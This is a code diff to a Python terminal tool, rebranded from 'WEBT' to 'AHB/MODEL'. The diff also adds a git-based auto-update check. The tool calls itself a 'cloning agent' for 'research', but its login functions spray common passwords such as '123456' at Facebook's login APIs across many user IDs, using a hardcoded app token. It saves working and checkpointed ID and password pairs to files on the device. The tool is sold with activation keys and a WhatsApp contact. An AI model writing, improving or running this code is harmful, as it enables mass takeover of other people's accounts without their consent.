@@ -171,31 +171,32 @@ def save_data(data):
 
 def header():
     clear_screen()
-    set_session_title("webt 👑")
+    set_session_title("AHB/MODEL 👑")
     width = get_terminal_width()
     
-    # Stable ASCII Art (using simple characters)
+    # Stable ASCII Art (using block characters)
     art = [
-        " __      __  ____  ____  _____   _____  ____   ____  __    ",
-        "  \\ \\    / / | ___||  _ \\|_   _| |_   _||  _ \\ / __ \\|  |   ",
-        "   \\ \\/\\/ /  | _|  | _ _/  | |     | |  | | | | |  | |  |   ",
-        "    \\_/\\_/   |____||_| \\_\\ |_|     |_|  |_| |_|\\____/|____| ",
-        "                                                          "
+        "    █████╗ ██╗  ██╗██████╗ ",
+        "   ██╔══██╗██║  ██║██╔══██╗",
+        "   ███████║███████║██████╔╝",
+        "   ██╔══██║██╔══██║██╔══██╗",
+        "   ██║  ██║██║  ██║██████╔╝",
+        "   ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ "
     ]
     
     # Title/Version/Description
     console.print("\n".join([console.center_text(line, width) for line in art]))
-    console.print(console.center_text("[bold cyan]WEB TOOL 👑[/bold cyan]", width))
+    console.print(console.center_text("[bold green]AHB/MODEL 👑[/bold green]", width))
     console.print(console.center_text("[dim]a professional terminal cloning agent[/dim]", width) + "\n")
     
     # Session Details
-    session_info = f"--- session\n ▎ [bold cyan]hwid[/bold cyan]     [white]{get_hwid()}[/white]\n ▎ [bold cyan]mode[/bold cyan]     [white]Premium[/white]\n ▎ [bold cyan]owner[/bold cyan]    [white]Ali Khan[/white]"
-    show_panel(session_info, title="WEB TOOL 👑", subtitle="v5.6.0", footer="cybervaultke · Ali Khan")
+    session_info = f"--- session\n ▎ [bold green]hwid[/bold green]     [white]{get_hwid()}[/white]\n ▎ [bold green]mode[/bold green]     [white]Premium[/white]\n ▎ [bold green]owner[/bold green]    [white]Ali Khan[/white]"
+    show_panel(session_info, title="AHB/MODEL 👑", subtitle="v5.6.0", footer="cybervaultke · Ali Khan")
 
 def about_us():
     header()
     about_text = (
-        "\n [bold cyan]ABOUT WEB TOOL 👑[/bold cyan]\n"
+        "\n [bold green]ABOUT AHB/MODEL 👑[/bold green]\n"
         " This is a high-speed multi-threaded account security\n"
         " testing agent developed for research purposes.\n\n"
         " [bold yellow]OWNERSHIP[/bold yellow]\n"
@@ -278,10 +279,10 @@ def check_activation():
 
         data["key"] = user_key; save_data(data)
         header()
-        console.print("\n [bold green]WEBT 👑 SESSION AUTHORIZED[/bold green]")
+        console.print("\n [bold green]AHB/MODEL 👑 SESSION AUTHORIZED[/bold green]")
         linex()
-        console.print(f" ▎ [bold cyan]status[/bold cyan]    [bold green]AUTHORIZED[/bold green]")
-        console.print(f" ▎ [bold cyan]expiry[/bold cyan]    [bold yellow]{key_data.get('expiry', 'N/A')}[/bold yellow]")
+        console.print(f" ▎ [bold green]status[/bold green]    [bold green]AUTHORIZED[/bold green]")
+        console.print(f" ▎ [bold green]expiry[/bold green]    [bold yellow]{key_data.get('expiry', 'N/A')}[/bold yellow]")
         linex()
         console.print(" ▎ WhatsApp: [bold green]https://wa.me/923052962654[/bold green]")
         linex()
@@ -332,7 +333,7 @@ def login_1(uid):
     try:
         with console.lock:
             ts = datetime.now().strftime('%H:%M:%S')
-            msg = console._apply_tags(f"\r {DIM}[{ts}]{RESET} [bold cyan]WEBT 👑[/bold cyan] [bold yellow]{loop}[/bold yellow] [bold green]OK:{len(oks)}[/bold green] [bold red]CP:{len(cps)}[/bold red] ")
+            msg = console._apply_tags(f"\r {DIM}[{ts}]{RESET} [bold green]AHB/MODEL 👑[/bold green] [bold yellow]{loop}[/bold yellow] [bold green]OK:{len(oks)}[/bold green] [bold red]CP:{len(cps)}[/bold red] ")
             sys.stdout.write(msg); sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
@@ -356,12 +357,12 @@ def login_1(uid):
             }
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
-                console.log(f"[bold green]WEBT-OK[/bold green] [white]{uid} | {pw} | {creationyear(uid)}[/white]")
-                open('/sdcard/WEBT-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                console.log(f"[bold green]AHB-OK[/bold green] [white]{uid} | {pw} | {creationyear(uid)}[/white]")
+                open('/sdcard/AHB-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid); break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                console.log(f"[bold yellow]WEBT-CP[/bold yellow] [dim]{uid} | {pw}[/dim]")
-                open('/sdcard/WEBT-CP.txt', 'a').write(f"{uid}|{pw}\n")
+                console.log(f"[bold yellow]AHB-CP[/bold yellow] [dim]{uid} | {pw}[/dim]")
+                open('/sdcard/AHB-CP.txt', 'a').write(f"{uid}|{pw}\n")
                 cps.append(uid); break
         loop += 1
     except: pass
@@ -371,7 +372,7 @@ def login_2(uid):
     try:
         with console.lock:
             ts = datetime.now().strftime('%H:%M:%S')
-            msg = console._apply_tags(f"\r {DIM}[{ts}]{RESET} [bold cyan]WEBT 👑[/bold cyan] [bold yellow]{loop}[/bold yellow] [bold green]OK:{len(oks)}[/bold green] [bold red]CP:{len(cps)}[/bold red] ")
+            msg = console._apply_tags(f"\r {DIM}[{ts}]{RESET} [bold green]AHB/MODEL 👑[/bold green] [bold yellow]{loop}[/bold yellow] [bold green]OK:{len(oks)}[/bold green] [bold red]CP:{len(cps)}[/bold red] ")
             sys.stdout.write(msg); sys.stdout.flush()
         for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
             with requests.Session() as session:
@@ -379,12 +380,12 @@ def login_2(uid):
                 url = f"https://b-api.facebook.com/method/auth.login?format=json&email={uid}&password={pw}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&method=GET&locale=en_US&client_country_code=US&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
-                    console.log(f"[bold green]WEBT-OK[/bold green] [white]{uid} | {pw} | {creationyear(uid)}[/white]")
-                    open('/sdcard/WEBT-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    console.log(f"[bold green]AHB-OK[/bold green] [white]{uid} | {pw} | {creationyear(uid)}[/white]")
+                    open('/sdcard/AHB-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid); break
                 elif 'checkpoint' in str(po):
-                    console.log(f"[bold yellow]WEBT-CP[/bold yellow] [dim]{uid} | {pw}[/dim]")
-                    open('/sdcard/WEBT-CP.txt', 'a').write(f"{uid}|{pw}\n")
+                    console.log(f"[bold yellow]AHB-CP[/bold yellow] [dim]{uid} | {pw}[/dim]")
+                    open('/sdcard/AHB-CP.txt', 'a').write(f"{uid}|{pw}\n")
                     cps.append(uid); break
         loop += 1
     except: pass
@@ -452,7 +453,45 @@ def cloning_process(name, prefixes):
     linex()
     safe_input(" Press Enter to return to menu...")
 
+def check_for_updates():
+    try:
+        # Check for latest version hash from GitHub
+        response = requests.get("https://api.github.com/repos/cybervaultke/AHB/commits/main", timeout=5)
+        if response.status_code == 200:
+            latest_commit = response.json().get('sha')
+            update_file = ".update_info"
+            local_hash = ""
+            if os.path.exists(update_file):
+                with open(update_file, 'r') as f:
+                    local_hash = f.read().strip()
+            
+            if local_hash and local_hash != latest_commit:
+                console.print("\n [bold yellow]UPDATE AVAILABLE[/bold yellow]")
+                console.print(f" ▎ [bold cyan]New version detected![/bold cyan]")
+                choice = safe_input(" [?] Update automatically? (y/n): ")
+                if choice.lower() == 'y':
+                    with console.status("Updating AHB/MODEL"):
+                        try:
+                            import subprocess
+                            # Attempt to pull. If local changes conflict, this will raise an error.
+                            subprocess.run(["git", "pull"], check=True, capture_output=True, text=True)
+                            with open(update_file, 'w') as f:
+                                f.write(latest_commit)
+                            console.print("\n [bold green]Update successful! Please restart the tool.[/bold green]")
+                            sys.exit(0)
+                        except subprocess.CalledProcessError as e:
+                            console.print(f"\n [bold red]Update failed![/bold red]")
+                            console.print(f" [dim]Reason: {e.stderr.strip()}[/dim]")
+                            console.print(" [yellow]Suggestion: Re-clone the repository to resolve conflicts.[/yellow]")
+                            safe_input(" Press Enter to continue...")
+            elif not local_hash:
+                with open(update_file, 'w') as f:
+                    f.write(latest_commit)
+    except Exception as e:
+        console.print(f" [bold red]Update check failed: {e}[/bold red]")
+
 if __name__ == '__main__':
+    check_for_updates()
     if check_activation():
         while True:
             old_clone_menu()
